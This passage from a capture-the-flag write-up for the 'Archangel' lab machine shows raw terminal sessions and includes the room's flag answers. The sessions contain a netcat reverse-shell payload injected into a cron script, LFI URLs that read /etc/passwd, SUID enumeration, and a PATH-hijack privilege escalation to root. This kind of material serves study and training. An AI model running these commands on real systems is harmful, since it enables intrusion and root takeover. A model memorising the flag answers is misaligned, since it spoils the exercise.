@@ -273,3 +273,278 @@ cat /etc/crontab
 ```
 ```text
 # command to install the new version when you edit this file
+```
+```text
+# and files in /etc/cron.d. These files also have username fields,
+```
+```text
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+```
+```text
+# m h dom mon dow user  command
+*/1 *   * * *   archangel /opt/helloworld.sh
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+www-data@ubuntu:/home/archangel$ cat /opt/helloworld.sh
+cat /opt/helloworld.sh
+#!/bin/bash
+echo "hello world" >> /opt/backupfiles/helloworld.txt
+
+www-data@ubuntu:/home/archangel$ cd /opt
+cd /opt
+www-data@ubuntu:/opt$ ls -la
+ls -la
+total 16
+drwxrwxrwx  3 root      root      4096 Nov 20  2020 .
+drwxr-xr-x 22 root      root      4096 Nov 16  2020 ..
+drwxrwx---  2 archangel archangel 4096 Nov 20  2020 backupfiles
+-rwxrwxrwx  1 archangel archangel   66 Nov 20  2020 helloworld.sh
+
+replacing the file with a payload 
+
+www-data@ubuntu:/opt$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.1.77 1337 >/tmp/f' >> /opt/helloworld.sh
+<1|nc 10.18.1.77 1337 >/tmp/f' >> /opt/helloworld.sh
+
+horizontal priv esc
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ rlwrap nc -nlvp 1337    
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::1337
+Ncat: Listening on 0.0.0.0:1337
+Ncat: Connection from 10.10.87.241.
+Ncat: Connection from 10.10.87.241:32794.
+/bin/sh: 0: can't access tty; job control turned off
+```
+
+## Privilege Escalation
+```text
+$ python3 -c 'import pty; pty.spawn("/bin/bash");'
+archangel@ubuntu:~$ whoami; id; pwd
+                    whoami; id; pwd
+whoami; id; pwd
+archangel
+uid=1001(archangel) gid=1001(archangel) groups=1001(archangel)
+/home/archangel
+
+archangel@ubuntu:~$ ls -lah
+                    ls -lah
+ls -lah
+total 44K
+drwxr-xr-x 6 archangel archangel 4.0K Nov 20  2020 .
+drwxr-xr-x 3 root      root      4.0K Nov 18  2020 ..
+-rw-r--r-- 1 archangel archangel  220 Nov 18  2020 .bash_logout
+-rw-r--r-- 1 archangel archangel 3.7K Nov 18  2020 .bashrc
+drwx------ 2 archangel archangel 4.0K Nov 18  2020 .cache
+drwxrwxr-x 3 archangel archangel 4.0K Nov 18  2020 .local
+drwxr-xr-x 2 archangel archangel 4.0K Nov 18  2020 myfiles
+-rw-r--r-- 1 archangel archangel  807 Nov 18  2020 .profile
+drwxrwx--- 2 archangel archangel 4.0K Nov 19  2020 secret
+-rw-rw-r-- 1 archangel archangel   66 Nov 18  2020 .selected_editor
+-rw-r--r-- 1 archangel archangel   26 Nov 19  2020 user.txt
+
+archangel@ubuntu:~$ cd secret
+                    cd secret
+cd secret
+archangel@ubuntu:~/secret$ ls -lah
+                           ls -lah
+ls -lah
+total 32K
+drwxrwx--- 2 archangel archangel 4.0K Nov 19  2020 .
+drwxr-xr-x 6 archangel archangel 4.0K Nov 20  2020 ..
+-rwsr-xr-x 1 root      root       17K Nov 18  2020 backup
+-rw-r--r-- 1 root      root        49 Nov 19  2020 user2.txt
+archangel@ubuntu:~/secret$ cat user2.txt
+                           cat user2.txt
+cat user2.txt
+thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}
+
+another method lfi
+
+http://mafialive.thm/test.php?view=php://filter//var/www/html/development_testing/resource=/etc/passwd
+
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin sshd:x:106:65534::/run/sshd:/usr/sbin/nologin archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash 
+
+http://mafialive.thm/test.php?view=php://filter//var/www/html/development_testing/resource=/home/archangel/user.txt
+
+thm{lf1_t0_rc3_1s_tr1cky} 
+
+https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1
+log poisoning
+
+priv esc
+
+archangel@ubuntu:~/secret$ find / -perm -4000 2>/dev/null |xargs ls -lah
+                           find / -perm -4000 2>/dev/null |xargs ls -lah
+find / -perm -4000 2>/dev/null |xargs ls -lah
+-rwsr-xr-x 1 root root        31K Aug 11  2016 /bin/fusermount
+-rwsr-xr-x 1 root root        43K Sep 17  2020 /bin/mount
+-rwsr-xr-x 1 root root        63K Jun 28  2019 /bin/ping
+-rwsr-xr-x 1 root root        44K Mar 23  2019 /bin/su
+-rwsr-xr-x 1 root root        27K Sep 17  2020 /bin/umount
+-rwsr-xr-x 1 root root        17K Nov 18  2020 /home/archangel/secret/backup
+-rwsr-xr-x 1 root root        75K Mar 23  2019 /usr/bin/chfn
+-rwsr-xr-x 1 root root        44K Mar 23  2019 /usr/bin/chsh
+-rwsr-xr-x 1 root root        75K Mar 23  2019 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root        40K Mar 23  2019 /usr/bin/newgrp
+-rwsr-xr-x 1 root root        59K Mar 23  2019 /usr/bin/passwd
+-rwsr-xr-x 1 root root       146K Sep 23  2020 /usr/bin/sudo
+-rwsr-xr-x 1 root root        19K Jun 28  2019 /usr/bin/traceroute6.iputils
+-rwsr-xr-- 1 root messagebus  42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root        10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root       427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
+
+archangel@ubuntu:~/secret$ ls -lah
+                           ls -lah
+ls -lah
+total 32K
+drwxrwx--- 2 archangel archangel 4.0K Nov 19  2020 .
+drwxr-xr-x 6 archangel archangel 4.0K Nov 20  2020 ..
+-rwsr-xr-x 1 root      root       17K Nov 18  2020 backup
+-rw-r--r-- 1 root      root        49 Nov 19  2020 user2.txt
+archangel@ubuntu:~/secret$ file backup
+                           file backup
+file backup
+backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9093af828f30f957efce9020adc16dc214371d45, for GNU/Linux 3.2.0, not stripped
+
+archangel@ubuntu:~/secret$ strings backup
+                           strings backup
+strings backup
+/lib64/ld-linux-x86-64.so.2
+setuid
+system
+__cxa_finalize
+setgid
+__libc_start_main
+libc.so.6
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+u+UH
+[]A\A]A^A_
+cp /home/user/archangel/myfiles/* /opt/backupfiles
+:*3$"
+GCC: (Ubuntu 10.2.0-13ubuntu1) 10.2.0
+/usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/Scrt1.o
+__abi_tag
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.0
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+backup.c
+__FRAME_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+_ITM_deregisterTMCloneTable
+_edata
+system@@GLIBC_2.2.5
+__libc_start_main@@GLIBC_2.2.5
+__data_start
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+__bss_start
+main
+setgid@@GLIBC_2.2.5
+__TMC_END__
+_ITM_registerTMCloneTable
+setuid@@GLIBC_2.2.5
+__cxa_finalize@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.gnu.property
+.note.gnu.build-id
+.note.ABI-tag
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.plt.sec
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.data
+.bss
+.comment
+
+cp /home/user/archangel/myfiles/* /opt/backupfiles
+
+archangel@ubuntu:~/secret$ which cp
+                           which cp
+which cp
+/bin/cp
+archangel@ubuntu:~/secret$ echo $PATH
+                           echo $PATH
+echo $PATH
+/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+Creamos un script para que ejecute bash con el nombre cp y le damos permisos de ejecucion, tambien agregamos al inicio la direccion /home/archangel/secret a la variable PATH.
+
+archangel@ubuntu:~/secret$ echo "/bin/bash" > cp
+                           echo "/bin/bash" > cp
+echo "/bin/bash" > cp
+archangel@ubuntu:~/secret$ chmod +x cp
+                           chmod +x cp
+chmod +x cp
+archangel@ubuntu:~/secret$ export PATH=/home/archangel/secret/:$PATH
+                           export PATH=/home/archangel/secret/:$PATH
+export PATH=/home/archangel/secret/:$PATH
+archangel@ubuntu:~/secret$ echo $PATH
+                           echo $PATH
+echo $PATH
+/home/archangel/secret/:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+archangel@ubuntu:~/secret$ ./backup
+                           ./backup
+./backup
+
+root@ubuntu:~/secret# cat /root/root.txt
+                      cat /root/root.txt
+cat /root/root.txt
+thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}
+```
+![[Pasted image 20220925114518.png]]
+Get a shell and find the user flag
+Poison!!!
+Do privilege escalation
+Get User 2 flag
+Root the machine and find the root flag
+certain paths are dangerous
+
+## Flags / Answers
+- ***thm{f0und_th3_r1ght_h0st_n4m3}** *
+- ***thm{explo1t1ng_lf1}***
+- ***thm{lf1_t0_rc3_1s_tr1cky}***
+- ***thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}***
+- ***thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}***
+
+## Notes / Lessons Learned
+[[Jack-of-All-Trades]]
+
